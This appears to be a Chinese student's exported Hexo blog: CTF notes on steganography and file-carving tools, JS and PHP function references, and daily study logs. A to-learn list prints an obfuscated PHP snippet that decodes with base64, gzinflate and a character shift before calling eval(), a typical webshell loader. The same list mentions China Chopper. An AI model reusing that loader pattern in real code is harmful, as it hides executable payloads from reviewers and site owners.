<h2 id="tweakPNG"><a href="#tweakPNG" class="headerlink" title="tweakPNG"></a>tweakPNG</h2><p>可识别出png错误的CRC并给出正确值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRC：每个png图像头部均为：图像头、长度、宽度、高度、CRC组成，CRC本身错误和高度错误都会导致CRC值的错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/2.jpg" alt="2"></p>
<h3 id="利用tweakPNG所给值改CRC"><a href="#利用tweakPNG所给值改CRC" class="headerlink" title="利用tweakPNG所给值改CRC"></a>利用tweakPNG所给值改CRC</h3><p>可用010editor或winhex打开16进制</p>
<h3 id="跑一个python脚本求出正确高度"><a href="#跑一个python脚本求出正确高度" class="headerlink" title="跑一个python脚本求出正确高度"></a>跑一个python脚本求出正确高度</h3><p><img src="/2020/01/13/%E5%9B%BE%E5%83%8F%E7%9A%84%E9%9A%90%E5%86%99/1.jpg" alt="1"></p>
<h2 id="btftools"><a href="#btftools" class="headerlink" title="btftools"></a>btftools</h2><p><strong>使用场景：windows下的cmd，对加密过的图片进行解密</strong></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btftools.exe decode braincopter 要解密图片名称 -output 输出文件名</span><br><span class="line">btftools.exe run 上一步输出的文件</span><br></pre></td></tr></table></figure>



<h2 id="silenteye"><a href="#silenteye" class="headerlink" title="silenteye"></a>silenteye</h2><p>可以将文字或文件隐藏到图片</p>
<h2 id="jpg图像加密"><a href="#jpg图像加密" class="headerlink" title="jpg图像加密"></a>jpg图像加密</h2><h3 id="stegdetect工具检测加密方式"><a href="#stegdetect工具检测加密方式" class="headerlink" title="stegdetect工具检测加密方式"></a>stegdetect工具检测加密方式</h3><p>主要用于分析jpg文件，可以检测到通过steg，JPHide，OutGuess，invisib Secrets，F5，appendX，camouflage等隐写工具隐藏的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stegdetect xxx.jpg</span><br><span class="line">stegdetect -s(敏感度) xxx.jpg</span><br></pre></td></tr></table></figure>



<h3 id="JPhide（图形界面）"><a href="#JPhide（图形界面）" class="headerlink" title="JPhide（图形界面）"></a>JPhide（图形界面）</h3><p>基于最低有效位LSB的JPG图像隐写算法</p>
<h3 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a>Outguess</h3><p><strong>该工具要编译使用：./configure &amp;&amp; make &amp;&amp; make install</strong></p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">outguess -r 要解密的文件名 输出结果文件名</span><br></pre></td></tr></table></figure>



<h3 id="F5"><a href="#F5" class="headerlink" title="F5"></a>F5</h3><p>进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从cmd进入该目录</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Extact 要解密的文件名 -p 密码</span><br></pre></td></tr></table></figure>



<h2 id="二维码处理"><a href="#二维码处理" class="headerlink" title="二维码处理"></a>二维码处理</h2><ol>
<li>补全</li>
<li>取反</li>
<li>stegsolve颜色通道</li>
</ol>
]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
  </entry>
  <entry>
    <title>JS split()方法 [将字符串分割成字符串数组]</title>
    <url>/2020/01/12/JS-split-%E6%96%B9%E6%B3%95-%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E5%89%B2%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="split"><a href="#split" class="headerlink" title="split()"></a>split()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>split() 方法用于把一个字符串分割成字符串数组。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.split(separator,limit)</span><br></pre></td></tr></table></figure>

<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>separator</td>
<td>可选。字符串或正则表达式，从该参数指定的地方分割 string Object。</td>
</tr>
<tr>
<td>limit</td>
<td>可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</td>
</tr>
</tbody></table>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Array</td>
<td>一个字符串数组。该数组是通过在 separator 指定的边界处将字符串 string Object 分割成子串创建的。返回的数组中的字串不包括 separator 自身。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="省略“separator”参数"><a href="#省略“separator”参数" class="headerlink" title="省略“separator”参数"></a>省略“separator”参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split();</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">How are you doing today?</span><br></pre></td></tr></table></figure>



<h4 id="“separator”参数为””"><a href="#“separator”参数为””" class="headerlink" title="“separator”参数为””"></a>“separator”参数为””</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>结果分割每个字符，包括空格:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H,o,w, ,a,r,e, ,y,o,u, ,d,o,i,n,g, ,t,o,d,a,y,?</span><br></pre></td></tr></table></figure>



<h4 id="使用“limit“参数"><a href="#使用“limit“参数" class="headerlink" title="使用“limit“参数"></a>使用“limit“参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot; &quot;,3);</span><br></pre></td></tr></table></figure>

<p>结果将输出3个数组的值:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">How,are,you</span><br></pre></td></tr></table></figure>



<h4 id="使用一个字符作为分隔符"><a href="#使用一个字符作为分隔符" class="headerlink" title="使用一个字符作为分隔符:"></a>使用一个字符作为分隔符:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var str&#x3D;&quot;How are you doing today?&quot;;</span><br><span class="line">var n&#x3D;str.split(&quot;o&quot;);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">H,w are y,u d,ing t,day?</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-12日目标</title>
    <url>/2020/01/12/2020-01-12%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-12目标"><a href="#2020-01-12目标" class="headerlink" title="2020-01-12目标"></a>2020-01-12目标</h2><ol>
<li>听力10min+单词10个</li>
<li>早上9：00前起床</li>
<li>高数定积分&amp;&amp;不定积分</li>
<li>b站题型介绍看完</li>
<li>正则表达式第三章</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-11总结"><a href="#2020-01-11总结" class="headerlink" title="2020-01-11总结"></a>2020-01-11总结</h2><ol>
<li>更新了Ubuntu，更换了apt源</li>
<li>下午复习了高数第二三单元</li>
<li>总结了ctf文件的合并与分离</li>
<li>解决了github hexo图片无法成功上传的问题</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>正则表达式第三章</td>
<td>N</td>
</tr>
<tr>
<td>下午复习高数</td>
<td>Y</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>N</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>Y</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>文件的合并与分离</title>
    <url>/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/</url>
    <content><![CDATA[<h2 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h2><h3 id="file命令"><a href="#file命令" class="headerlink" title="file命令"></a>file命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file filename</span><br></pre></td></tr></table></figure>

<p><strong><em>注：若使用file命令显示类型为data，则可能出现了文件头缺失，可自行打开“010editor”修改文件头。</em></strong></p>
<h3 id="不同文件有不同文件头"><a href="#不同文件有不同文件头" class="headerlink" title="不同文件有不同文件头"></a>不同文件有不同文件头</h3><p><img src="/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/fileHead.png" alt></p>
<h2 id="文件的分离"><a href="#文件的分离" class="headerlink" title="文件的分离"></a>文件的分离</h2><h3 id="binwalk工具-自动"><a href="#binwalk工具-自动" class="headerlink" title="binwalk工具(自动)"></a>binwalk工具(自动)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分析文件：binwalk filename</span><br><span class="line">分离文件：binwalk -e filename</span><br></pre></td></tr></table></figure>



<h3 id="foremost-自动"><a href="#foremost-自动" class="headerlink" title="foremost(自动)"></a>foremost(自动)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost filename -o outputFilename</span><br></pre></td></tr></table></figure>



<h3 id="dd-半自动半手动分离"><a href="#dd-半自动半手动分离" class="headerlink" title="dd(半自动半手动分离)"></a>dd(半自动半手动分离)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;输入的文件名 of&#x3D;输出的文件名 bs&#x3D;设置读写块的大小 copy&#x3D;一共读取几个读写快 slip&#x3D;跳过几个读写快开始读取</span><br></pre></td></tr></table></figure>



<p>比如对”1.txt”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234567890abcde</span><br></pre></td></tr></table></figure>

<p>实施命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;1.txt of &#x3D;2.txt bs&#x3D;5 count&#x3D;3 skip&#x3D;1</span><br></pre></td></tr></table></figure>

<p>会得到”2.txt”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">67890abcde</span><br></pre></td></tr></table></figure>



<h3 id="010editor-半自动半手动"><a href="#010editor-半自动半手动" class="headerlink" title="010editor(半自动半手动)"></a>010editor(半自动半手动)</h3><p>找出想分离的部分，右键并点击”save selection”.</p>
<h2 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h2><h3 id="linux下的文件合并"><a href="#linux下的文件合并" class="headerlink" title="linux下的文件合并"></a>linux下的文件合并</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat file1 file2 file3 &gt; outputFilename</span><br></pre></td></tr></table></figure>

<p>完整性检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum filename</span><br></pre></td></tr></table></figure>



<h3 id="windows下的文件合并"><a href="#windows下的文件合并" class="headerlink" title="windows下的文件合并"></a>windows下的文件合并</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &#x2F;B file1+file2+file3 outputFilename</span><br></pre></td></tr></table></figure>

<p>完整性检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf技巧</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-11日目标</title>
    <url>/2020/01/10/2020-01-11%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-11日目标"><a href="#2020-01-11日目标" class="headerlink" title="2020-01-11日目标"></a>2020-01-11日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>正则表达式第三章</li>
<li>下午复习高数</li>
<li>b站题型介绍看完</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-10总结"><a href="#2020-01-10总结" class="headerlink" title="2020-01-10总结"></a>2020-01-10总结</h2><ol>
<li>安装好了VMware Workstation</li>
<li>忙完了正则表达式第二章</li>
<li>JS函数部分看完</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>正则表达式第二章</td>
<td>Y</td>
</tr>
<tr>
<td>下午复习高数</td>
<td>N</td>
</tr>
<tr>
<td>JS函数部分看完</td>
<td>Y</td>
</tr>
<tr>
<td>b站题型介绍看完</td>
<td>N</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-10日目标</title>
    <url>/2020/01/10/2020-01-10%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-10日目标"><a href="#2020-01-10日目标" class="headerlink" title="2020-01-10日目标"></a>2020-01-10日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>正则表达式第二章</li>
<li>下午复习高数</li>
<li>JS函数部分看完</li>
<li>b站题型介绍看完</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-09总结"><a href="#2020-01-09总结" class="headerlink" title="2020-01-09总结"></a>2020-01-09总结</h2><ol>
<li>安装好了python</li>
<li>大致浏览了JS函数有关内容，但是还要继续巩固</li>
<li>看了一会b站ctf</li>
<li>打了排球</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(Y/N)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>N</td>
</tr>
<tr>
<td>南邮ctf 深入研究 文件包含</td>
<td>N</td>
</tr>
<tr>
<td>Js函数部分</td>
<td>N</td>
</tr>
<tr>
<td>看b站ctf概览建立一个框架</td>
<td>N</td>
</tr>
<tr>
<td>安装好python环境</td>
<td>Y</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>N</td>
</tr>
<tr>
<td>状态</td>
<td>N</td>
</tr>
</tbody></table>
<p><strong><u>不想通过打分让自己觉得虽然没有完成但至少做了一点，从这次开始总结只有Y/N。哪怕只差一点也是没有完成。</u></strong></p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-09日目标</title>
    <url>/2020/01/09/2020-01-09%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-09日目标"><a href="#2020-01-09日目标" class="headerlink" title="2020-01-09日目标"></a>2020-01-09日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>南邮ctf 深入研究 文件包含</li>
<li>Js函数部分</li>
<li>看b站ctf概览建立一个框架</li>
<li>安装好python环境</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-08总结"><a href="#2020-01-08总结" class="headerlink" title="2020-01-08总结"></a>2020-01-08总结</h2><ol>
<li>买了前年的高数卷子，复习了高数第二单元</li>
<li>完成了南邮ctf 文件包含</li>
<li>在做文件包含时发现自己学的知识有些杂有些乱，所以想找一些ctf概览的视频明确一下方向</li>
<li>安装了几个有用工具和java环境</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>南邮ctf 文件包含</td>
<td>8</td>
</tr>
<tr>
<td>复习高数第二单元</td>
<td>10</td>
</tr>
<tr>
<td>Js函数部分</td>
<td>0</td>
</tr>
<tr>
<td>晚上1：00前睡觉</td>
<td>10</td>
</tr>
<tr>
<td>状态</td>
<td>7</td>
</tr>
</tbody></table>
<p>ps: 2020-01-07考完英语完全放松了一天，所以那一天的计划是空白。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-01-07日目标</title>
    <url>/2020/01/06/2020-01-07%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-07日目标"><a href="#2020-01-07日目标" class="headerlink" title="2020-01-07日目标"></a>2020-01-07日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>9:30在2206考大英1</li>
<li>南邮ctf 文件包含</li>
<li>复习高数第二单元</li>
<li>Js函数部分</li>
<li>晚上1：00前睡觉</li>
</ol>
<h2 id="2020-01-06总结"><a href="#2020-01-06总结" class="headerlink" title="2020-01-06总结"></a>2020-01-06总结</h2><ol>
<li>把英语段落翻译看了，做了几篇新闻</li>
<li>复习了第一单元高数，还要多见见极限的题型</li>
<li>看完了JS基础部分</li>
<li>南邮ctf 单身二十年 &amp;&amp; decode</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>5</td>
</tr>
<tr>
<td>继续学习完善正则表达式</td>
<td>0</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>10</td>
</tr>
<tr>
<td>花一点时间备考大英1</td>
<td>9</td>
</tr>
<tr>
<td>南邮ctf  <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">单身二十年</a></td>
<td>10</td>
</tr>
<tr>
<td>晚上1:00前睡觉</td>
<td>10</td>
</tr>
<tr>
<td>状态</td>
<td>8</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php eval()函数 [把字符串作为PHP代码执行]</title>
    <url>/2020/01/06/php-eval-%E5%87%BD%E6%95%B0-%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BAPHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>把字符串作为PHP代码执行</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(phpcode)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$string &#x3D; &#39;cup&#39;;</span><br><span class="line">$name &#x3D; &#39;coffee&#39;;</span><br><span class="line">$str &#x3D; &#39;This is a $string with my $name in it.&#39;;</span><br><span class="line">echo $str. &quot;\n&quot;;</span><br><span class="line">eval(&quot;\$str &#x3D; \&quot;$str\&quot;;&quot;);</span><br><span class="line">echo $str. &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>eval函数的参数的字符串末尾一定要有分号，在最后还要另加一个分号（这个分号是php限制）。</li>
<li>注意单引号，双引号和反斜杠的运用。如果参数中带有变量时,并且变量有赋值操作的话，变量前的$符号钱一定要有\来转义。如果没有赋值操作可以不需要。</li>
<li>注意在命令式字符串（包括分号）两边必须要有双引号或者根据需要用单引号。否则报错。 命令式字符串是指：字符串中包括echo、print之类的命令的时候。 如果参数只有一个变量则可以不用。</li>
</ol>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;test eval function&quot;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS push()/unshift()函数 [在数组末尾/起始加新元素并返回新长度]</title>
    <url>/2020/01/06/JS-push-%E5%87%BD%E6%95%B0-%E5%9C%A8%E6%95%B0%E7%BB%84%E6%9C%AB%E5%B0%BE%E5%8A%A0%E6%96%B0%E5%85%83%E7%B4%A0%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%96%B0%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>push() 方法可向数组的末尾添加一个或多个元素，并返回新的长度</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array.push(item1,item2,...,itemX)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var fruits &#x3D; [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];</span><br><span class="line">y&#x3D;fruits.push(&quot;Kiwi&quot;,&quot;Lemon&quot;,&quot;Pineapple&quot;)</span><br><span class="line">alert(y);</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Banana,Orange,Apple,Mango,Kiwi,Lemon,Pineapple</span><br><span class="line">有一个弹窗显示&quot;7&quot;</span><br></pre></td></tr></table></figure>



<h2 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h2><p><em>与push()基本相同，只不过是把新元素添到数组开头并返回数组长度。</em></p>
]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS call()/apply()/bind()函数 [强制重新定义this对象]</title>
    <url>/2020/01/06/JS-call-apply-bind-%E5%87%BD%E6%95%B0-%E5%BC%BA%E5%88%B6%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89this%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>这个哥们讲得超棒，就引用哈 <a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">他的文章</a>！</p>
]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>一些学习中遇到可学却还没来得及学的东西</title>
    <url>/2020/01/06/%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0%E4%B8%AD%E9%81%87%E5%88%B0%E5%8F%AF%E5%AD%A6%E5%8D%B4%E8%BF%98%E6%B2%A1%E6%9D%A5%E5%BE%97%E5%8F%8A%E5%AD%A6%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
    <content><![CDATA[<ol>
<li><p><a href="https://www.runoob.com/html/html5-form-attributes.html" target="_blank" rel="noopener">HTML表单属性</a></p>
</li>
<li><p><a href="https://www.runoob.com/css/css-pseudo-classes.html" target="_blank" rel="noopener">CSS伪类</a></p>
</li>
<li><pre><code>&lt;?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}
eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
?&gt;</code></pre></li>
<li><p>看b站视频大致了解pwn和逆向</p>
</li>
<li><p>中国菜刀调试</p>
</li>
<li><p>DVWA csp bypass high级别理解</p>
</li>
<li><p>等额本息偿付</p>
</li>
<li><p>c语言反编译数组和指针查看其区别</p>
</li>
</ol>
<h1 id="已学"><a href="#已学" class="headerlink" title="已学"></a>已学</h1><ol>
<li>抓包技术</li>
<li>菜鸟php与ajax</li>
</ol>
]]></content>
      <tags>
        <tag>杂七杂八</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-06日目标</title>
    <url>/2020/01/06/2020-01-06%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-01-06日目标"><a href="#2020-01-06日目标" class="headerlink" title="2020-01-06日目标"></a>2020-01-06日目标</h2><ol>
<li>听力10min+单词10个</li>
<li>继续学习完善正则表达式</li>
<li><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></li>
<li>花一点时间备考大英1</li>
<li>南邮ctf  <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">单身二十年</a></li>
<li>晚上1:00前睡觉</li>
</ol>
<h2 id="2020-01-05总结"><a href="#2020-01-05总结" class="headerlink" title="2020-01-05总结"></a>2020-01-05总结</h2><p>总的来说今天算是给自己放了个假，睡觉睡到中午，打了一个下午排球，到晚上七点左右才开始学习，也算是给这些天有点低迷的心情缓和一下吧！</p>
<ol>
<li>总算把域名调试好了，不然deploy一次就给我发一封邮件我受不住（GNAME文件中多打了www）</li>
<li>JS 表单- JS验证API</li>
<li>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></li>
<li>复习了一会会英语</li>
</ol>
<table>
<thead>
<tr>
<th>目标</th>
<th>(0/10)</th>
</tr>
</thead>
<tbody><tr>
<td>听力10min+单词10个</td>
<td>10</td>
</tr>
<tr>
<td>继续学习完善正则表达式</td>
<td>0</td>
</tr>
<tr>
<td>南邮ctf <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">AAencode</a></td>
<td>10</td>
</tr>
<tr>
<td><a href="https://www.runoob.com/js/js-conventions.html" target="_blank" rel="noopener">学习至JS代码规范</a></td>
<td>6</td>
</tr>
<tr>
<td>花一点时间备考大英1</td>
<td>5</td>
</tr>
<tr>
<td>状态</td>
<td>6</td>
</tr>
</tbody></table>
<h2 id="对于南邮-AAencode那一题："><a href="#对于南邮-AAencode那一题：" class="headerlink" title="对于南邮 AAencode那一题："></a>对于南邮 AAencode那一题：</h2><ol>
<li>以后看到中文乱码可以下载本地有utf-8换一下</li>
<li>AAencode是一种把JS代码转化成颜文字的加密，直接在console里运行即可解码</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>JS isFinite函数 [检测是否为无穷大]</title>
    <url>/2020/01/06/JS-isFinite%E5%87%BD%E6%95%B0-%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E4%B8%BA%E6%97%A0%E7%A9%B7%E5%A4%A7/</url>
    <content><![CDATA[<h2 id="isFinite"><a href="#isFinite" class="headerlink" title="isFinite()"></a>isFinite()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>如果 number 是 NaN（非数字），或者是正、负无穷大的数，则返回 false。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isFinite(value)</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.write(isFinite(123)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(-1.23)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(5-2)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(0)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(&quot;Hello&quot;)+ &quot;&lt;br&gt;&quot;);</span><br><span class="line">document.write(isFinite(&quot;2005&#x2F;12&#x2F;12&quot;)+ &quot;&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">true</span><br><span class="line">false</span><br><span class="line">false</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>Js parseFloat()函数 [去除数字后的非数字字符]</title>
    <url>/2020/01/05/Js-parseFloat-%E5%87%BD%E6%95%B0-%E5%8E%BB%E9%99%A4%E6%95%B0%E5%AD%97%E5%90%8E%E7%9A%84%E9%9D%9E%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="parseFloat"><a href="#parseFloat" class="headerlink" title="parseFloat()"></a>parseFloat()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。</p>
